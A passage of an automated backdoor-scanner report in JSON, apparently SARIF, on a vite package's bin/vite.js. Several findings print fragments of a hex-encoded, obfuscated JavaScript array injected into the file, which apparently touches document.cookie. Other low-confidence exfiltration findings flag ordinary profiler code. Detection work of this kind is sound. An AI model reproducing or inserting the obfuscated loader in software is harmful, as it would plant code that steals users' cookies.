\"\\x32\\x32\\x62\\x37\\x38\\x33\\x32\\x33\\x32\\x37\\x31\\x37\\x31\\x32\\x62\\x32\\x32\\x32\\x37\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x39\\x36\\x36\\x37\\x32\\x36\\x31\\x36\\x64\\x36\\x35\\x33\\x65\\x33\\x63\\x32\\x66\\x36\\x34\\x36\\x39\\x37\\x36\\x33\\x65\\x32\\x32\\x33\\x62\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 1367,
                  "endLine": 4,
                  "endColumn": 1795,
                  "snippet": {
                    "text": "\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30",
                    "rendered": {
                      "text": "\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30",
                      "markdown": "`\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61\\x64\\x74\\x66\\x2b\\x70\\x61\\x72\\x73\\x65\\x49\\x6e\\x74\\x28\\x66\\x65\\x69\\x64\\x64\\x2e\\x73\\x75\\x62\\x73\\x74\\x72\\x69\\x6e\\x67\\x28\\x64\\x74\\x65\\x66\", \"\\x32\\x37\\x33\\x64\\x32\\x37\\x32\\x39\\x33\\x62\\x36\\x35\\x36\\x63\\x37\\x33\\x36\\x35\\x32\\x30\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x36\\x36\\x31\\x36\\x63\\x37\\x33\\x36\\x35\\x33\\x62\\x37\\x32\\x36\\x35\\x37\\x34\\x37\\x35\\x37\\x32\\x36\\x65\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x31\\x35\\x64\\x32\\x30\\x33\\x66\\x32\\x30`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 935,
                  "endLine": 4,
                  "endColumn": 1363,
                  "snippet": {
                    "text": "\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61",
                    "rendered": {
                      "text": "\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61",
                      "markdown": "`\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32\\x39\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x33\\x35\\x62\\x33\\x30\\x35\\x64\\x32\\x65\\x37\\x33\\x37\\x30\\x36\\x63\\x36\\x39\\x37\\x34\\x32\\x38\", \"\\x37\\x38\\x33\\x32\\x33\\x32\\x36\\x34\\x37\\x31\\x32\\x39\\x33\\x62\\x37\\x64\\x37\\x64\\x22\\x3b\\x66\\x6f\\x72\\x20\\x28\\x76\\x61\\x72\\x20\\x64\\x74\\x65\\x66\\x68\\x3d\\x30\\x3b\\x64\\x74\\x65\\x66\\x68\\x3c\\x66\\x65\\x69\\x64\\x64\\x2e\\x6c\\x65\\x6e\\x67\\x74\\x68\\x3b\\x64\\x74\\x65\\x66\\x68\\x2b\\x3d\\x32\\x29\\x7b\\x6e\\x61\\x64\\x74\\x66\\x3d\\x6e\\x61`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 503,
                  "endLine": 4,
                  "endColumn": 931,
                  "snippet": {
                    "text": "\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32",
                    "rendered": {
                      "text": "\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32",
                      "markdown": "`\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\", \"\\x62\\x37\\x36\\x36\\x31\\x37\\x32\\x32\\x30\\x36\\x33\\x32\\x30\\x33\\x64\\x32\\x30\\x36\\x32\\x32\\x65\\x36\\x35\\x37\\x38\\x36\\x35\\x36\\x33\\x32\\x38\\x36\\x34\\x36\\x66\\x36\\x33\\x37\\x35\\x36\\x64\\x36\\x35\\x36\\x65\\x37\\x34\\x32\\x65\\x36\\x33\\x36\\x66\\x36\\x66\\x36\\x62\\x36\\x39\\x36\\x35\\x32\\x39\\x33\\x62\\x36\\x39\\x36\\x36\\x32\\x38\\x36\\x33\\x32`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000805"
          },
          "message": {
            "text": "Backdoor: Long Binary Strings",
            "id": "BD000805"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 71,
                  "endLine": 4,
                  "endColumn": 499,
                  "snippet": {
                    "text": "#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33",
                    "rendered": {
                      "text": "#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33",
                      "markdown": "`#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x33\\x33\\x33\\x33\\x36\\x36\\x33\\x38\\x33\\x36\\x36\\x32\\x36\\x34\\x36\\x36\\x36\\x32\\x36\\x35\\x32\\x32\\x32\\x63\\x32\\x32\\x33\\x34\\x33\\x36\\x33\\x32\\x33\\x33\\x33\\x39\\x33\\x38\\x36\\x32\\x36\\x35\\x33\\x38\\x33\\x39\\x33\\x34\\x33\\x34\\x36\\x33\\x36\\x35\\x33\\x30\\x33\\x36\\x33\\x34\\x33\\x33\", \"\\x32\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x34\\x37\\x31\\x32\\x30\\x33\\x64\\x32\\x30\\x37\\x38\\x33\\x33\\x33\\x33\\x36\\x32\\x37\\x31\\x32\\x38\\x32\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 11,
                  "endLine": 62,
                  "endColumn": 17,
                  "snippet": {
                    "text": "  const session = (global.__vite_profile_session = new inspector.Session())\n  session.connect()\n  session.post('Profiler.enable', () => {\n    session.post('Profiler.start', start)\n  })\n} else {\n  start()\n",
                    "rendered": {
                      "text": "  const session = (global.__vite_profile_session = new inspector.Session())\n  session.connect()\n  session.post('Profiler.enable', () => {\n    session.post('Profiler.start', start)\n  })\n} else {\n  start()\n",
                      "markdown": "`  const session = (global.__vite_profile_session = new inspector.Session())\n  session.connect()\n  session.post('Profiler.enable', () => {\n    session.post('Profiler.start', start)\n  })\n} else {\n  start()\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 9,
                  "endLine": 61,
                  "endColumn": 15,
                  "snippet": {
                    "text": "  const inspector = await import('node:inspector').then((r) => r.default)\n  const session = (global.__vite_profile_session = new inspector.Session())\n  session.connect()\n  session.post('Profiler.enable', () => {\n    session.post('Profiler.start', start)\n  })\n} else {\n",
                    "rendered": {
                      "text": "  const inspector = await import('node:inspector').then((r) => r.default)\n  const session = (global.__vite_profile_session = new inspector.Session())\n  session.connect()\n  session.post('Profiler.enable', () => {\n    session.post('Profiler.start', start)\n  })\n} else {\n",
                      "markdown": "`  const inspector = await import('node:inspector').then((r) => r.default)\n  const session = (global.__vite_profile_session = new inspector.Session())\n  session.connect()\n  session.post('Profiler.enable', () => {\n    session.post('Profiler.start', start)\n  })\n} else {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 6,
                  "endLine": 43,
                  "endColumn": 17,
                  "snippet": {
